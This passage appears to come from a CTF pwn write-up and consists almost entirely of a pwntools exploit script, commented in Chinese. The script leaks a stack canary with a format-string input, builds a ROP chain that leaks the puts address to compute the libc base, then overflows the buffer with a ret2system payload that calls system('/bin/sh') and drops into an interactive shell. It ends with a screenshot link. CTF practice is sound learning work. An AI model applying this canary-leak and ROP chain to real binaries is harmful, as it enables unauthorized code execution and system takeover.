offset = 0xc8
pop_rdi_ret = 0x4011fc

# 阶段1：泄露canary
r.recvuntil(b"Send your format beacon:\n")
r.sendline(b"%1$016lx.%2$p")
line = r.recvline().strip()
canary = int(line.split(b'.', 1)[0], 16)
print("[+]canary->", hex(canary))

# 阶段2：泄露puts真实地址
r.recvuntil(b"Send your access packet:\n")
payload_2 = b'a' * offset
payload_2 += p64(canary)
payload_2 += b'b' * 8
payload_2 += p64(pop_rdi_ret)
payload_2 += p64(elf.got['puts'])
payload_2 += p64(elf.plt['puts'])
payload_2 += p64(0x4013bd)  # 返回main
r.sendline(payload_2)

r.recvuntil(b"[-] packet rejected\n")
puts_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
print("[+]puts->", hex(puts_leak))

# 阶段3：ret2system
r.recvuntil(b"Send your format beacon:\n")
r.sendline(b"%1$p")
r.recvuntil(b"Send your access packet:\n")

libc.address = puts_leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

payload_3 = b'a' * offset
payload_3 += p64(canary)
payload_3 += b'b' * 8
payload_3 += p64(ret)          # 栈对齐
payload_3 += p64(pop_rdi_ret)
payload_3 += p64(bin_sh)
payload_3 += p64(system)
r.sendline(payload_3)

r.interactive()
```

![image-20260524152516373](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154551732-1434354838.png)

---